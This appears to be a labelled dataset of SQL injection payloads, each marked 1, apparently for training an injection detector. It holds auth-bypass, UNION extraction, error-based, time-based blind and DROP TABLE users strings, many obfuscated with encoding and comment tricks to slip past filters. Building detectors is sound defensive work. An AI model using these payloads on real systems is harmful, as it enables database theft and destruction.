"1%u0027%u0020%4f%52%u00%320IF(%73ubstring%28d%61tabas%65(),%u%300201,%u00%3201)=%u0027a%%750027,%u0020SLEE%50(5),%%7500200)%u0020%u0020#%u0020more_noise--", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#yuna0j", 1
"%25u0027%2f%2a%2112345%2A%2fUnIon%25U0020sELECt%25U0020nulL%2c%25u0020nUlL%2c%25U0020nULL%25u0020--%25U0020", 1
"' XOR extractva%6cue(1,%63onc%61t(%30x5c,versio%6e()))--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--#txof9whe5cz4vct", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 /*!*/AND 1=1--", 1
"1'%20A%4eD s%75bstring(da%74abase(), 1%2c 1) = 's' --", 1
"%3B%2F%2A%2112345%2A%2FSELECT%20pg_sleep%285%29%3B%20--", 1
"1  AND  1	=%091#qslaq6mjh", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3--", 1
"'UNIONSELECT%0a1,2,3/*!*/AND1=1--#nqcdwdy5liy", 1
"%27%20AND%201%3D1%20--%20", 1
"1%29uNiOn%0AsELEcT1%2cDatAbaSe%28%29%2c3--", 1
"test' OR '1'='1' /*#ggycjw", 1
"tesT%27%20Or%20%271%27%3d%271%27%20/*", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#dylhn", 1
"test'/**/OR/**/'1'='1'/**//*/**/#/**/more_noise", 1
"%u0027/**/UNION/**/SELECT/**/1,2,3--", 1
"'				AND				extractvalue(1,concat(0x5c,version()))--#tayv80lmzsoeufn", 1
"; SELECT pg_sleep(5); --#6k5obijy1sk", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#jf8vemfkx9", 1
"'%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,2,3--", 1
"' OR '1'%3d%271", 1
"%27%20ANd%201%3DCONVErt%28iNt%2C%40%40VErsION%29--", 1
"WAITFOR/*!*/DELAY '0:0:5'--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20 /*!*/AND 1=1--", 1
"WAIT%46ORDELAY%0d%0a%270:0%3a5'--", 1
"W%41IT%46OR DEL%41Y '0:0:5'--", 1
"1%27/**/OR %61scii(substrin%67(databas%65(), 1, 1)) %3e 100  -- random_noise%2d%2d", 1
"TesT'/**/Or/**/'1'	=  '1'/**/--/**/", 1
"%27%20ANd%201%3DConVerT(int,@@VErSiOn)--", 1
"'    OR    '1'>  = '1", 1
"'/**/%4fR EXIS%54S(SELECT 1 FROM user%73)-%2d OR (1)", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))--", 1
"'				aND				1IN				(1)1				--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 OR (1)----1wtyt17e359m93h", 1
"%27%20AND%201%3D1%20--%20--sh51y9718pba", 1
"'/*!12345*/AND 1>=1 --", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1%27%20aND%20suBStRing(DAtAbaSE(),%201,%201)%20%3D%20%27S%27%20%20or%20(1)--#zx4m19e5m52", 1
"1)UN/*!*/IONSELECT1,database(),3%0d%0a--random_noise----05uu50tm", 1
"%27%20or%201%3d1%20--%20", 1
"%2527%25%320OR%2520%31%2%353D1%2520--%252%30", 1
"test%27OR%271%27%3D%271%27%2F%2A%2112345%2A%2FOR%20%27b%27%3D%27b%27--%2F%2A%250d%250a%2A%2F%2F%2A%250a%2A%2F", 1
"1))/*!%312345*/%55NION SE%4cECT 1,d%61tabase(),%33--", 1
"; SeL%45CT pG%5FSLeep(5%29; --", 1
"WAITFOR DELAY '0:0:5'----9qccwygdec", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%20--%20random_noise--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"'UNIONSELECT1,2,3 OR (1)--/*%0d%0a*/", 1
"' uNIOn seLECT NULl, nULL, NUll --", 1
"%74e%73t'/**/OR/**/'1'='1'/**//* OR (1)", 1
"1/*!12345*/%41ND1=1/*%0a*/", 1
"1%20AND%201%3E%3D1%20AND%20%27a%27%3D%27a%27", 1
"1)UNIoN/*%0D%0A*/SEleCT1,DaTABaSE(),3/*%0a*/#moRE_nOise--/*%0a*/", 1
"1) UNION SELECT 1%2cda%74abase%28),3-%2d", 1
"1%u0027%U0020oR%u0020IF(substrINg(dATABASe(),%u00201,%U00201)=%U0027a%U0027,%u0020SleEP(5),%u00200)%u0020----m39rt", 1
"1%u0027/*!12345*/UNIoN%u0020SEleCT%u0020tAblE_naMe,%u0020NULL,%u0020nULl%u0020FROm%u0020iNfORmATIOn_schEMA.TaBles%u0020--", 1
";%20seLECt%20PG_SLeEP(5);%20--", 1
"' OR 1<=1 --", 1
"1'/**//**//**/oR/**//**//**/ascIi(SuBstrINg(DaTABaSe(),/**//**//**/1,/**//**//**/1))/**//**//**/>/**//**//**/100/**//**//**/--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
";/*!12%3345*/DROP%20TABLE u%73ers;%20--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271 /*!*/AND 1=1", 1
"' OR 1=1 %2d- #5bx%6ecusg%722t", 1
"1'UNIO%4eSELECTtable%5fname,/*%0%64%0a*/nul%6c,nul%6cFROMinformation_schema.ta%62l%65s/*%%30%61*/%23", 1
"more_noise--", 1
"tes%2574%25u0027%25u0020O%2552%25u0020%25u00271%25u0027%3D%25u0027%2531%25u0027%25u0020--%25u0020", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020", 1
"%27/*!12345*/AND%201%3Dconvert(int,@@version)--", 1
"1' aNd SuBstriNG(daTABASe(), 1, 1) = 'S'  OR 'b'='b'--", 1
"%27XOR%2F%2A%250d%250a%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%250d%250a", 1
"%27%20XOR%201%3D1%20--%20", 1
"'/**/OR/**/1=1/**/--/**/", 1
"1 AND 1=1 OR 'b'='b'", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20", 1
"'%09UNION%09SELECT%09null,%09null,%09null%09%09#%09more_noise--%09", 1
"AdmIN'/*!12345*/or '1'='1 # mORe_noisE", 1
"%61dmin'/**/X%4fR/**/'1'='1/**/OR%20'b'='b'", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
"ADMIN%27%20OR%20%271%27%3d%271", 1
"%27%09%09UN/*!12345*/ION%09%09SELECT%09%091,2,3--", 1
"1))UNION", 1
"SELECT/*%0d%0a*/1,database(),3 # more_noise--/*%0d%0a*/", 1
"adMIn' XOR '1'='1", 1
"1/*!*/AND 1=1", 1
"1' AND substring(database(), 1, 1) = 's' --#7fra6i", 1
"%27ANd%0AeXtRAcTVAlUE%281%2CCOncaT%280x5c%2CversIon%28%29%29%29--%250A", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29IN%20%281%29%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"%27%20A/*!*/ND%201%3dcONVErT(inT,@@veRsIoN)--", 1
"test'/**/OR/**/'1'='1'/**/--/**/", 1
"; drOp tAblE USerS; --", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2F%20OR%20%281%29--%2F%2A%2A%2F", 1
"%27%20Or%20ExIStS%28SeLecT%201%20FROM%20usERS%29--", 1
"WAITFO/*!12345*/R/**/DELAY/**/'0:0:5'--", 1
"'AND%0a1=convert(int,@@version)--", 1
"' oR%20'1'='1 /*!*/AND 1%3d1%23x%39teo447mmb2", 1
"test%27%20OR%20%271%27%3D%271%27%20/*OR/*%0d%0a*/'b'='b'#8ka8r/*%0d%0a*/", 1
"1'OR", 1
"I%46(substring%28databas%65(),1,%0a1)='a',%53L%45EP(5),0%29--%0d%0a", 1
"%27/*!*/AND/**/1%3D1/**/--/**/", 1
"; SELE%43T %70g_sle%65p(5);  # more_noise--", 1
"1'/**/uniON/**/sELECT/**/Table_NAME,/**/NUll,/**/NUll/**/from/**/infoRMaTiON_SChEmA.tABLeS/**/--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%09=%09%u00271", 1
"test%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2F%25u00271%25u0027%3D%25u00271%25u0027%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"Waitfor DElay '0:0:5'----Ec4oBJtoI", 1
"WAITFO/*!12345*/R%20DELAY%20%270%3A0%3A5%27--", 1
";%20seLecT%20Pg_SLEEp(5);%20--", 1
"1%%750027%u002%30A%4e%44%u00%320substri%6eg(database(),%u00201,%u00201)%u00%320=%u%30020%u0027s%u%30027%u0020--", 1
"%u0027/**/OR/**/1IN%u0020(1)1/**/--/**/", 1
"1%27%20O/*!12345*/R%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"' OR 1=1 -- #jp8ncb7cfkk7", 1
"%27%20%20%20%20%20%20AND%20%20%20%20%20%201%09%3D%20convert(int,@@version)--", 1
"wAITfOr%20DeLaY%20%270:0:5%27--", 1
"%27%20OR%20EXISTS%28SEL/*!*/ECT%201%20FROM%20users%29--", 1
"test%25u0027%2F%2A%2A%2F%25u0020OR%25u0020%25u0020%25u00271%25u0027%2520%3D%2509%25u00271%25u0027%25u0020%25u0020--%25u0020%25u0020", 1
"; DroP TABle uSErs; --", 1
"1%u0027%u0020A/**/ND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"WAITFOR%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027--", 1
"1%29%20UNION%20SE%4cECT%201%2Cda%74ab%61%73%65%28%29%2C3--", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#ax47qc", 1
"1) unioN selECt 1,databaSe(),3--", 1
"test' OR '1'='1' /*--m922eq5pn", 1
"%u0027%u0020oR%u0020exIsts(sel/*!12345*/EcT%U00201%U0020FrOM%U0020uSErS)--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020 /*!*/AND 1=1--", 1
"%u0027%u0020O/**/R%u0020%u00271%u0027<=%u00271--xktvx55q", 1
"%u0027%u0020And%u0020extracTVaLue(1,CoNCAT(0X5c,vErSIOn()))--", 1
"' UNiOn sElecT 1,2,3--", 1
"%27%20XOR%20%31%3d1%20--%20", 1
";%20DROP%20TABLE%20users;%20--", 1
"%27%20UNION%20SELECT%201,2,3--", 1
"1'/**/OR/**/IF(subs%74r%69ng(d%61tabase(),/**/1%2c/**/%31)='a%27,/**/SLEEP(5),/**/0)/**//**/#/**/more_noise--", 1
"1'/**/O/*!12345*/R/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**//**/AND/**/'a'='a'----phen4nbz", 1
"test' OR '1'=%271'%20/*", 1
"1)UNION%0aSELECT/*%0a*/1,database(),3--", 1
"' aNd exTRAcTvAlUe(1,ConcaT(0x5C,veRSiOn()))--", 1
"1' UNION SELEC%54 %74able_name,%20null, nu%6c%6c %46%52OM information_schema.%74ables --#i1b%71hlfpz95uq8b", 1
"'/*!*/ANd/**/1=cOnvert(InT,@@VErSiOn)--", 1
"%u0027%u0020A/**/ND%u0020%31=%63o%6evert(i%6et,@@version)--", 1
"%27/**/OR/**/%271%27%3D%271 # more_noise", 1
"%27%20Or%20%2531IN%20%281%291%20--%2520", 1
"' OR '1%27='1 /%2a!*/AND 1=%31", 1
"'/**/U%4eION/**/S%45L%45CT/**/1,%32,3/*!*/# mo%72e_noise--", 1
"1))%09%09UNION%09%09SELECT%09%091,database(),3--", 1
"admin%u0027%u0020O/*!12345*/R%u0020%u00271%u0027%09=  %u00271", 1
"admin' XOR '1'='1 OR (1)", 1
"test'/**/O/*!*/R/**/'1'='1'/**//**/OR/**/(1)--/**/", 1
"admin%27%20XOR%20%271%27%3D%271--nm6t4jk", 1
"%3B%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpg_sleep%285%29%3B%2F%2A%2A%2F%2F%2A%2A%2F%23%2F%2A%2A%2Fmore_noise--", 1
"%253b%20D%2552OP%20TABLE%20users%3B%20%252d- -- random_noise", 1
"' UNION SELECT null, null, null  # more_noise-- --p7i9cpx", 1
"1)/**/uNION seLECt 1,DATABASE(),3--", 1
"' AND 1>=convert(int,@@version)--", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)--", 1
"1%27/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**//**/#/**/more_noise--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#uc8t1c6", 1
"%31%27%20AN%44%20%73ubstring(dat%61base%28),%201,%201)%20%3D%20%27s%27%20--", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise----rf8lnws", 1
"%27O/*!*/R%271%27%3D%271/*%0d%0a*/", 1
"1%27%20anD%20sUBsTRiNg(dATabase(),%201,%201)%20%3D%20%27S%27%20--", 1
"1%u0027/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"%27%20AnD%201%3D1%20%20--%20random_noise--%20", 1
"1%20AND%201%3C%3D1", 1
"admin%27O/*!*/R%0%64%0a%2%371%27%3%44%271", 1
"%u0027/*!12345*/AND%u00201=convert(int,@@version)--", 1
";/*!*/DROP TABLE users;%20%2d%2d", 1
"%27%20oR%201%3d1%20--%20#69O8ZQdiXX", 1
"1'%09%09OR%09%09IF(substring(database(),%09%091,%09%091)/**/= 'a',%09%09SLEEP(5),%09%090)%09%09--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3/**/AND/**/'a'='a'--", 1
"' UNION SELECT null, null, null  -- random_noise--", 1
"1 xOR 1=1", 1
"'/*!12345*/AND 1=convert(int,@@version)--", 1
"1))%20%20UN/*!*/ION%20%20SELECT%20%201,database(),3--", 1
"'/**/AND 1=1 --", 1
"1' oR iF(SUbsTRINg(DATabAse(), 1, 1)<='A', SlEEP(5), 0)  -- random_noise--", 1
"'/**/&&/**/1=1/**//**/--/**/random_noise--/**/", 1
"1%20An%64%201%3d%31", 1
"test%2527%2520OR%2520%25271%2527%253D%25271%2527%2520%2F%2A", 1
"test%27%20%4f%52%20%271%27%3D%271%27%20--%20", 1
"'%09%09%09%09%09AND%09%09%09%09%091	LIKE%20convert(int,@@version)--", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020----nju78u10y", 1
";/**/SELECT pg_sleep(5);  OR 'b'='b'--#btx0h9b", 1
"' or '1'>='1 OR (1)", 1
"1) unIon selEct 1,dAtabaSE(),3--#G6i3S", 1
"%2527%2520AND%25201%253Dconvert%28int%2C%40%40version%29--", 1
"test'%09%09%09%09%4fR%09%09%09%09'1'%20=/**/ '%31'%09%09%09%09/* AND 'a'='a'", 1
"1))/*!12345*/UNION SELECT 1,database(),3--", 1
"'/*!12345*/UNIONSELECT%0d%0a1,2,3--/*%0a*/", 1
"test' OR '1'='1' /*#2rjzghxpy1rji", 1
"1' oR ASCiI(SUBsTRIng(DatAbasE(), 1, 1)) > 100 --", 1
"1%29%25u0020UN%2549ON%25u0020%2553ELECT%25u00201%2Cdatabase%28%2529%2C%2533--", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1'ORIF(substring(database(),1,1)LIKE'a',/*%0d%0a*/SLEEP(5),0)", 1
"--", 1
"test%u0027/*%21*/OR%u0%302%371%%750%3027=%u%300271%u0027/*%0d%0a*//*%0a", 1
"1'/*!*/XOR IF(substring(database(), 1, 1)>='a', SLEEP(5), 0) ----td1higqifimilj", 1
"test'/*!12345*/OR '1'='1' /*", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/ OR 'b'='b'--", 1
"%3B%20SEL/*!*/ECT%20pg_sleep%285%29%3B%20--", 1
"%u0027%u0020AN%44%u00201=1%u0020 OR 'b'='b'--%20", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))/*!*/# more_noise----tihy01spluejd", 1
"test' OR '1'='1' -- #5tly1bktcu24e", 1
"1)/*!*/UN%49ON%20/*%0d%0a*/SELECT%0d%0a1,da%74abase%28),3--/*%0d%0a*/", 1
"admin'%09%09OR%09%09'1'  =	'1", 1
"%27%20&&%201%3D1%20--%20#a0uu9x13czd", 1
"1'%20AND%20substring(database(),%201,%201)%20 =%09%20's'%20--", 1
"'		OR		1 =  1		--", 1
"' OR EXISTS(SELECT 1 FROM users)--#qqggm3", 1
"%3B%2520sElecT%2520pG_slEep%285%29%3B%2520--", 1
"%27%20%20UNION%20%20SELECT%20%201%2C2%2C3--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"%27 OR%20'1'='1", 1
"'/*!*/xOr ExiSts(SeLEct 1 FROm USerS)--", 1
"%%750027%u0020OR%u0020EXISTS%28SELECT%u00201%u0%3020FROM%u%30020%75s%65rs)--", 1
"%27%20AND%201%3Dconvert(int,@@version) OR (1)--", 1
"1/*!12345*/and 1=1 OR (1)", 1
"TeST%27%2f%2A%2A%2For%2f%2a%2A%2f%271%27%3d%271%27%2F%2a%2A%2f%2f%2A", 1
"' AND 1=convert(int,@@version) -- random_noise--", 1
"%27%20%20%20%20AND%20%20%20%201%09%3D%25201%2520--%2520", 1
"admin%27%20OR%20%271%27%3D%271#syctrjnj", 1
"1)/**/UnIOn/**/SeLect/**/1,dAtABASE(),3--", 1
";/*!*/SELECT pg_sleep(5); --", 1
"' UNION SELECT null, null, null  AND 'a'='a'--", 1
"%27%20OR%201%3D1%20 -- random_noise--%20", 1
";/**/SELECT/**/pg_sleep(5);/**/----j7v0tih9", 1
"admin' OR '1'>='1", 1
"W%41ITFOR DELAY %27%30:0:5'--", 1
"'O/*!*/R", 1
"'1'='1", 1
";%20dROp%20TABLe%20UsErS;%20 /*!*/AND 1=1--", 1
"%U0027%u0020Or%u00201>=1%u0020--%U0020", 1
"1)/**/UNION SELECT 1,database(),3--#tz3tl6p1vh7e", 1
"%u0027%u0020%4fR%u%30020%u00271%%750027> =%20%u002%371", 1
"1'%20%20%20OR%20%20%20IF(substring(database(),%20%20%201,%20%20%201) =%09'a',%20%20%20SLEEP(5),%20%20%200)%20%20%20--", 1
"'/*!*/UNION SELECT null, null, null --", 1
"' AND extractvalue(1,conc%61t(%30x5c%2c%76ersion())%29--", 1
"%3B%2520seleCT%2520Pg_sLEEp%285%29%3B%2520--", 1
"'%20%20%20%20%20OR%20%20%20%20%201%09= 1%20%20%20%20%20--%20%20%20%20%20", 1
"%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers%3B%2F%2A%2A%2F--", 1
"' OR EXISTS(SELECT 1 FROM users)----8kxvucd", 1
"' UNION SELECT null, null, null  /*!*/AND 1=1-- --0m91vrbllw", 1
"'/**/UNIONSELECT%0d%0a1,2,3--", 1
"'/**/Or/**/'1'<='1#v2g9wk4mh", 1
"'/**/OR/**/'1'%20=  '1#93tqqj", 1
"1))/*!12345*/uNIOn/**/sElECT/**/1,DaTAbaSE(),3/**/#/**/MORE_nOisE--", 1
"%27%2F%2A%21%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29--", 1
"1'%20Or ASCii(S%75bsTrING(DAtABa%73E(), 1,%201)%29 > 100 --", 1
"tEST'/**/Or/**/'1'='1'/**/--/**/--B6piNnkkL", 1
"test'					XOR					'1'%20=%09'1'					 -- random_noise--					--c3j61mf5q81q", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#fjgz1hy", 1
"test%27%20XOR%20%271%27%3D%271%27%20%2F%2A", 1
";%20DROp%20tAbLe%20Users;%20----ahohrdk8m5qz5a", 1
"1 aNd 1>=1", 1
"'/**/OR/**/'1'='1", 1
"1'/**/OR/**%2fIF(substr%69%6e%67(dat%61ba%73e(),/**/1,/**/1)='%61',/**/SLEEP(%35),/**/0)/**/--", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2FIF%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%3D%27a%27%2C%2F%2A%2A%2FSLEEP%285%29%2C%2F%2A%2A%2F0%29%2F%2A%2A%2F--", 1
";/**/DROP/**/TABLE/**/users;/**/--#11r5c46", 1
"1%u0020AND%u00201=1", 1
"1'ORascii(substring(database(),1,1))/*%0a*/>/*%0a*/100--", 1
";			SELECT			pg_sleep(5);			----9r9q5zc6j84y", 1
"'/**/uNiOnSEleCT", 1
"NULl,NUlL,/*%0d%0a*/null%0a--", 1
"'UNION/*%0d%0a*/SELECT1,2,3--", 1
"%27/**/UNION/**/SELECT/**/1,2,3--#1jjv27mat0f6kb6", 1
"'%20UNION%20SELECT%201,2,3--#ifczrg9", 1
"admin%27%20%7C%7C%20%271%27%3D%271%20OR%20%27b%27%3D%27b%27", 1
"1 XOR 1=1", 1
"1 %41ND 1=1", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/ /*!*/AND 1=1--", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version())) OR 'b'='b'--%0a--c0kx9", 1
"1%25u0027%25u0020%26%26%25u0020%281%3D1%29substr%2569ng%28da%2574a%2562ase%28%29%2C%25u002%25301%2C%25u%25300201%29%25u0020%3D%25u%2530%253020%25%25750027s%25u0027%25u00%25320--", 1
"WAITFOR%u0020D%45LAY%u00%320%u002%370:0:5%u002%37--", 1
"'%09%09UNION%09%09SELECT%09%091,2,3--", 1
"'/*!*/or '1'='1#wu40urm", 1
"; SELECT pg_%73leep(5%29; -%2d#1%6a16n", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----10g2q0k", 1
"' XOR 1<=1 -- --kyhxt2rvrw74hse", 1
"1'||%0d%0aascii(substring(database(),1,1))%0d%0a>100--%0d%0a", 1
"'/*!*/OR'1'='1/*%0a*/", 1
"admin' OR '1'='1 OR (1)", 1
"%u0027UNIONSELECT", 1
"1,2,3--", 1
"1%27UNIONSELECT/*%0a*/table_name,null,null%0d%0aFROMinformation_schema.tables--", 1
"%27%%320AND%20extractvalu%65(1,concat(0x5c,ve%72sion()%29)%2d-", 1
"1%27%20anD%20SUbstring(daTABaSe(),%201,%201)%20%3D%20%27S%27%20--", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271--2iqh0kz", 1
"; DROP TaBle uSers; --", 1
";DROP/*%0a*/TABLE/*%0d%0a*/users;--/*%0a*/", 1
"TesT%27%20XOR%20%271%27IN%20(1)%271%27%20--%20", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--", 1
"1' and subSTrINg(dATabasE(), 1, 1) = 's' ----gqyls", 1
"'     OR     EXISTS(SELECT     1     FROM     users) -- random_noise--", 1
"%u0027%u0020A%4e%44%u00201%3dconvert(int,@@versi%6fn)--", 1
"'/**/AND ex%74ractval%75e(1,concat(%30x5c,vers%69%6fn()))--#yod79ymwn", 1
"1%u0027%u0020UN/*!*/ION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"%27%20%7C%7C%201%253d1%20%252d-%20", 1
"AdMiN%25U0027%25u0020oR%25u0020%25u00271%25u0027%3D%25u00271", 1
"1'ORiF(subSTring(daTaBasE(),%0a1,", 1
"1)='a',SLEep(5),0)/*%0d%0a*/--", 1
"%27%20UnION%20SEleCt%201%2C2%2C3--", 1
"' OR EXISTS(SELECT 1 FROM users) AND 'a'='a'--", 1
"%u0027%u0020||%u0020EXISTS(SEL/*!12345*/ECT%u00201%u0020FROM%u0020users)--", 1
"1'   OR   ascii(substring(database(),   1,   1))   >   100   --", 1
"%27%20or%20%271%27%3D%271 AND 'a'='a'--s14t0lh8ic", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"' && 1=1 --", 1
"tEST%27%20or%20%271%27%3D%271%27%20--%20", 1
"%27%20OR%20%271%27%3D%271%23fm5jp", 1
"'/*!12345*/AND extractvalue(1,concat(0x5c,version()))----132kkfa3afq5", 1
"%u0027%u0020AND%u0020extractvalue(1,%63o%6ecat(0x5c,ve%72sio%6e(%29%29) OR (1)--", 1
"1%27%2509%2509%2509%2509%2509UNION%2509%2509%2509%2509%2509SELECT%2509%2509%2509%2509%2509table_name%2C%2509%2509%2509%2509%2509null%2C%2509%2509%2509%2509%2509null%2509%2509%2509%2509%2509FROM%2509%2509%2509%2509%2509information_schema.tables%2509%2509%2509%2509%2509--", 1
"1 AND 1	= 1 /*!*/AND 1	= 1", 1
"WAITFOR%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027%20AND%20%27a%27%3D%27a%27--", 1
"'O/*!12345*/R%0d%0a'1'='1/*%0a*/", 1
";/**/DROP/**/TABLE/**/users;/**/--", 1
"1%27%20O/*!*/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"' || 1=1  AND 'a'='a'--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 # more_noise--#emuqng1fkr3c", 1
"TEsT%27/*!*/OR%20%271%27%3D%271%27%20--%20", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%20%3D	%271%27%20%20%20%20--%20%20%20%20", 1
"'/**/oR/**/eXiSTs(s%45LEc%74/**/1/**/FROM/**/u%73eRs)%2d-#azjsbbfy12lm", 1
"%u0027/*!12345*/OR%u0020%u00271%u0027=%u00271", 1
"WAI%54FOR %44ELAY '0:0:%35'----dsez%38fwfq6mhp%6e4", 1
"%25u0027%25u0020AND%25u0020extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"%27OREXISTS%28SELECT%0A%2531%0A%2546ROM%2575sers%29-%252d", 1
"1' || (1=1)IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"'UNIONSELECTnull,%0d%0anull,null/*%0d%0a*/--/*%0d%0a*/", 1
"%27UNION", 1
"SELECTnull,null,null--/*%0d%0a*/", 1
"'/*%21*/OR    1	%3d%201%20       #   %20mo%72e_noise--", 1
"%u0027%u0020AND%u00201>=1%u0020--%u0020", 1
"%2527%09%09AND%09%091%2520%2520%253D%2520%25201%09%09--%09%09", 1
"%27UNIONSELECTnull,null,%20null%0a--%0a--mph%62ae%75u2k%6c", 1
"1'/**/O%52/**/ascii(substrin%67%28da%74abase(),/**/%31,/**/1))/**/%3e/*%2a/100/*%2a/--", 1
"'uNiOn/*%0a*/seLECT%0d%0a1,2,3--/*%0d%0a*/", 1
"%27%20OR%201%3D1%20%20--%20random_noise--%20", 1
"%3B%20DROP%20TABLE%20users%3B%20 # more_noise--", 1
"TeST'/*!*/OR/**/'1'='1'/**//*", 1
